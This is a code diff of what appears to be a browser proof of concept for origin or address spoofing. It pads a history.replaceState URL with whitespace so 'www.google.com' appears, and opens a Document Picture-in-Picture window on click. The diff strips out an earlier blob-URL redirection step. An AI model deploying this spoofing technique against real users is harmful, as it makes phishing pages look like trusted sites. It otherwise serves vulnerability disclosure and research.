@@ -13,19 +13,12 @@ html { font-family: sans-serif; height: 100%; width: 100%; cursor: pointer; }
 <script>
 originOutput.innerText = window.origin;
 var newWin;
-if(location.protocol!='blob:'){
-html = document.body.innerHTML;
-    blob = new Blob([html], {type: 'text/html'});
-    url = URL.createObjectURL(blob); 
-    window.open(url,"_self");
-}
 try {
-    history.replaceState('','','blob:https://ybt01.github.io                                                                                                                                                                                                                  www.google.com');
+    history.replaceState('','','https://ybt01.github.io                                                                                                                                                                                                                  www.google.com');
 } catch (error) {
     //
 }
 var runPoC = async () => {
-   if(location.protocol=='blob:'){
     newWin = await documentPictureInPicture.requestWindow();
     var newWinContent = newWin.document.createElement('div');
     newWinContent.innerHTML = `
@@ -44,7 +37,6 @@ iframe { border: 0; width: 100vw; height: 500px; }
     var newWinScript = newWin.document.createElement('script');
     newWinScript.innerText = "";
     newWin.document.body.appendChild(newWinScript);
-}
 }
 window.addEventListener('click', 
     runPoC
